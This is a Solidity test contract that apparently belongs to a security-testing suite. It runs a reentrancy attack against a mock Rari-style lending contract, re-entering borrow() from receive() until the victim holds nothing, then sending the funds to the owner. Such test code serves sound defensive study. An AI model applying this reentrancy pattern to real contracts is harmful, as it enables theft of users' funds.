// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {DAOWallet} from "./DAOWallet.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";
import {SafeMockRari} from "../attacks/rari/SafeMockRari.sol";

contract AttackSafeToken is Test {
  address public owner;
  MockERC20 public token;
  SafeMockRari public safeMockRari;

  constructor(address _token, address payable _mockRari) payable {
    owner = msg.sender;
    token = MockERC20(_token);
    safeMockRari = SafeMockRari(_mockRari);
  }

  /// @notice Reentrancy logic here
  /// @dev Doesn't need to payable because we are using ERC20, not ETH for collateral
  /// @param amount Amount of ERC20 tokens to deposit to trigger reentrancy
  function attackRari(uint256 amount) external {
    /// allowances
    token.approve(address(safeMockRari), amount);

    /// deposit and withdraw must be in the same function
    safeMockRari.depositTokens(amount);

    /// perform reentrancy call depositing ERC20 and pulling out ETH
    safeMockRari.borrow();
  }

  receive() external payable {
    if (address(safeMockRari).balance > 0) {
      safeMockRari.borrow();
    } else {
      console.log("victim account drained");
      payable(owner).transfer(address(this).balance);
    }
  }
}